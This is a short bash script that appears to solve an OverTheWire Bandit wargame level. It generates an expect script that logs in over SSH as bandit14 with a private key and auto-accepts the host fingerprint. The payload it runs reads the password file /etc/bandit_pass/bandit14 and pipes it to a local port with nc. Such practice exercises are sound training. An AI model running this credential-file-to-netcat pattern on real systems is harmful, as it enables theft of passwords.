#!/usr/bin/env bash

dir_with_permissions=/run/user/11013

expect_file=$dir_with_permissions/expect.exp
payload=$dir_with_permissions/payload.sh

touch $expect_file $payload

chmod 666 $dir_with_permissions/*.{exp,sh}

# In case this files exists and have content for previous executions
truncate -s 0 $expect_file
truncate -s 0 $payload

cat >> $expect_file << 'END'
#!/usr/bin/expect -f

log_user 0
set timeout 15

set payload [lindex $argv 0]

spawn bash -c "ssh -p 2220 -i ~/sshkey.private bandit14@localhost bash -s < $payload"

expect "(yes/no/[fingerprint])?"
send "yes\r"
interact
END

cat >> $payload << 'END'
#!/usr/bin/env bash
cat /etc/bandit_pass/bandit14 | nc localhost 30000
END

expect $expect_file $payload
#ssh -p 2220 -i ~/sshkey.private bandit14@localhost bash -s < "cat /etc/bandit_pass/bandit14 | nc localhost 30000"
